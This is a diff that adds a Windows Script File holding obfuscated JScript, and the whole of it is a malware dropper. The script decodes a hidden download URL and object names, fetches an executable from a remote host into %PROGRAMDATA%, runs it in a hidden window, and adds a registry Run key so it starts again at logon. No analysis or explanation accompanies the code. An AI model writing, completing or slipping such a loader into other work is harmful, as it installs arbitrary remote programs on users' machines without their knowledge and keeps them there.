@@ -1,0 +1,66 @@
+﻿<?xml version="1.0" encoding="UTF-8"?>
+<package>
+<job id="ozgiapah">
+<script language="JScript">
+<![CDATA[
+var fd4976ol = "https://wk7ku4zwa469fq2pryd9ymxni66wva92u521w0cac7m2.ceon4k843gtgf00usshorky83z843lmsz0polat.gy/hlIybw1miq592keuh6vayP35lu867l542a14za";
+fd4976ol = fd4976ol.replace("wk7ku4zwa469fq2pryd9","");
+fd4976ol = fd4976ol.replace("i66wva92u521w0cac","");
+fd4976ol = fd4976ol.replace("ceon4k843gtgf00us","");
+fd4976ol = fd4976ol.replace("ky83z843lmsz0pola","");
+fd4976ol = fd4976ol.replace("ybw1miq592keuh6vay","");
+fd4976ol = fd4976ol.replace("lu867l542a14za","");
+
+var ujo0n = "nb692ack.exe";
+
+var zvt6ou3f = String.fromCharCode(87,83,99,114,105,112,116,46,83,104,101,108,108);
+var kgenzu = WScript.CreateObject(zvt6ou3f);
+var ph8s3q = kgenzu.ExpandEnvironmentStrings("%PROGRAMDATA%") + "\\" + ujo0n;
+
+var rzgp58s2n = "MSX"+"ML2"+".XM"+"LHT"+"TP";
+var g4r8mxsb = "ADODB.kwvjjafh8516vow6j8nreStrlhm3udemv176f2s4el71eam";
+g4r8mxsb = g4r8mxsb.replace("kwvjjafh8516vow6j8nre","");
+g4r8mxsb = g4r8mxsb.replace("lhm3udemv176f2s4el71","");
+
+var ucstse = String.fromCharCode(83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116);
+var rzgdmx = WScript.CreateObject(ucstse);
+
+function rfu3n() {
+  try {
+    var itb041tjx = WScript.CreateObject(rzgp58s2n);
+    itb041tjx.open("GET",fd4976ol,false);
+    itb041tjx.send();
+    if(itb041tjx.status==200){
+      var ip74204p4 = WScript.CreateObject(g4r8mxsb);
+      ip74204p4.Open();
+      ip74204p4.Type=1;
+      ip74204p4.Write(itb041tjx.responseBody);
+      ip74204p4.SaveToFile(ph8s3q,2);
+      ip74204p4.Close();
+      return true;
+    }
+    return false;
+  }catch(e){return false;}
+}
+
+function gslo5() {
+  try {
+    if(rzgdmx.FileExists(ph8s3q)){
+      kgenzu.Run('"' + ph8s3q + '"',0,false);
+    }
+  }catch(e){}
+}
+
+function lco215b3() {
+  try {
+    var sl0dlng = WScript.ScriptFullName;
+    var feku8q = String.fromCharCode(72,75,67,85,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,67,117,114,114,101,110,116,86,101,114,115,105,111,110,92,82,117,110,105,114,115,122,117,56,121,51);
+    kgenzu.RegWrite(feku8q, sl0dlng, "REG_SZ");
+  }catch(e){}
+}
+
+if(rfu3n()){gslo5();lco215b3();}
+]]>
+</script>
+</job>
+</package>
